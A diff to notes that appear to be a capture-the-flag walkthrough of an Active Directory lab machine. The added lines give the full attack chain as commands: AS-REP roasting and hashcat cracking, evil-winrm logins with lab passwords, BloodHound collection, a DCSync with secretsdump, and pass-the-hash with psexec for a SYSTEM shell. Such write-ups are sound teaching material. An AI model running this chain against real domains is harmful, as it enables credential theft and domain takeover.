@@ -23,6 +23,25 @@ https://github.com/urbanadventurer/username-anarchy
 first,flast,first.last,firstl > unames.txt
 while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -
 dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
+hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
+
+With the gained credentials fsmith / Thestrokes23 we can try to login using WinRM (port
+5985). Windows Remote Management (WinRM), is a Windows-native built-in remote management
+protocol and it is often enabled for users that need to manage systems remotely. We can use evil-winrm(https://github.com/Hackplayers/evil-winrm) to connect to the remote system.
+evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
+Privilege Escalation
+can use a script such as WinPEAS(https://github.com/carlospolop/PEASS-ng/tree/master) to automate enumeration tasks. Use the upload command from our current WinRM session to transfer the binary to the remote server, and then run it.The script reveals that the user EGOTISTICALBANK\svc_loanmanager has been set to automatically
+evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+
+We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges.The bloodhoundpython ingestor can be used to remotely collect data from the Active Directory. Then, we can run bloodhound to visualise any available attack paths.
+sudo apt install bloodhound
+sudo pip install bloodhound-python
+bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.10.10.175 -c All
+
+Impacket's secretsdump.py(https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) can be used to perform DCSync attack
+secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
+Having successfully extracted the hash of the administrator, we can perform a Pass The Hass attack using Impacket's psexec.py(https://github.com/fortra/impacket/blob/master/examples/psexec.py) and the returned hash, and get a shell as SYSTEM
+psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff
 
 
 convert to sql_En
